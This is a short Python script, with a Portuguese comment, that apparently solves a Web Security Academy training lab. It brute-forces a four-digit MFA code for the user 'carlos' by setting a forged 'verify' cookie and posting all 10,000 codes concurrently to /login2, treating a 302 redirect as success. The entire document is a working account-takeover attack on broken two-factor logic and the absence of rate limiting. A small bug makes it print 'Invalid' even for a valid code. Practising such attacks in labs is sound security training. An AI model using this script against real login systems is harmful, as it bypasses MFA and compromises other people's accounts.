from requests import post
from concurrent.futures import ThreadPoolExecutor

#Coloque a URL aqui
baseurl = 'https://0a68005f04f8d7ff819da3ac00db0001.web-security-academy.net'
url = f'{baseurl}/login2'
username = 'carlos'

header = {
    'Cookie': f'verify={username}',
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv':137.0) Gecko/20100101 Firefox/137.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': baseurl,
    'Referer': url,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive',
}

mfa_code_list = [str(i).zfill(4) for i in range(10000)]

def testing_mfa(mfa_code):
    response = post(
        url,
        headers=header,
        data={'mfa-code': mfa_code},
        allow_redirects=False,
    )
    if response.status_code == 302:
        print(f'\033[92mValid mfa code: {mfa_code} code: {response.status_code}\033[0m')
    print(f'Invalid mfa code: {mfa_code} code: {response.status_code}')

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(testing_mfa, mfa_code) for mfa_code in mfa_code_list]
    for future in futures:
        future.result()


